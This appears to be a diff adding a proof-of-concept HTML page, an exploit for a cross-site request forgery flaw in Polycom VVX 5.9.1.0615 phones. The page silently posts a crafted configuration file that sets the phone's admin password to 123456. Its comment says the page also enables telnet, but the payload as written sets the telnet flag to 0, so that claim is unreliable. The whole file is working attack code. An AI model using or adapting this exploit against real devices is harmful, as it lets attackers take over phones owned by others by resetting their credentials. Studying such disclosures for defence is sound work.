@@ -1,0 +1,34 @@
+<html>
+  <!-- Polycom VVX 5.9.1.0615 CSRF - Changes Admin pass to 123456. Also turns telnet on, login Polycom/123456 -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/192.168.128.11\/form-submit\/Utilities\/configuration\/importFile", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------402251386101268401375671906");
+        xhr.withCredentials = true;
+        var body = "-----------------------------402251386101268401375671906\r\n" + 
+          "Content-Disposition: form-data; name=\"myfile\"; filename=\"polycomtelnet.cfg\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3cdevice device.set=\"1\"\x3e\n" + 
+          "\x3cauth device.auth.localAdminPassword.set=\"1\" device.auth.localAdminPassword=\"123456\"/\x3e\n" + 
+          "\x3ctelnet diags.telnetd.enabled=\"0\"\x3e\x3c/telnet\x3e\n" + 
+          "\r\n" + 
+          "-----------------------------402251386101268401375671906--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
